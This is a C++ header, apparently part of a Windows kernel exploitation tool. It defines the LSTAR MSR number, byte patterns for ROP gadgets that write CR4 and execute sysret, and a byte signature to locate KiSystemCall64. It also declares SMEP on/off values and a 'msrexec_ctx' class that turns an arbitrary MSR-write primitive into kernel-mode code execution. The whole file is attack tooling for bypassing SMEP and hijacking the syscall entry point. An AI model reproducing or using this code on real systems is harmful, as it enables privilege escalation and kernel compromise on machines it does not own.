#pragma once
#include "utils.hpp"

#define IA32_LSTAR_MSR 0xC0000082
#define MOV_CR4_GADGET "\x0F\x22\xE1\xC3"
#define POP_RCX_GADGET "\x59\xc3"
#define SYSRET_GADGET  "\x0F\x07"

#define KI_SYSCALL_SIG "\x0F\x01\xF8\x65\x48\x89\x24\x25\x00\x00\x00\x00\x65\x48\x8B\x24\x25\x00\x00\x00\x00\x6A\x2B"
#define KI_SYSCALL_MASK "xxxxxxxx????xxxxx????xx"
static_assert(sizeof KI_SYSCALL_SIG == sizeof KI_SYSCALL_MASK, "signature/mask invalid size...");

extern "C" std::uint32_t m_kpcr_rsp_offset;
extern "C" std::uint32_t m_kpcr_krsp_offset;

extern "C" std::uintptr_t m_pop_rcx_gadget;
extern "C" std::uintptr_t m_mov_cr4_gadget;
extern "C" std::uintptr_t m_sysret_gadget;

extern "C" std::uintptr_t m_smep_on;
extern "C" std::uintptr_t m_smep_off;

extern "C" std::uintptr_t m_system_call;
extern "C" void syscall_wrapper();

namespace vdm
{
	using callback_t = std::function<void()>;
	using writemsr_t = std::function<void(std::uint32_t, std::uintptr_t)>;

	class msrexec_ctx
	{
	public:
		explicit msrexec_ctx(writemsr_t wrmsr);
		void exec(callback_t kernel_callback);
	private:
		writemsr_t wrmsr;
	};
}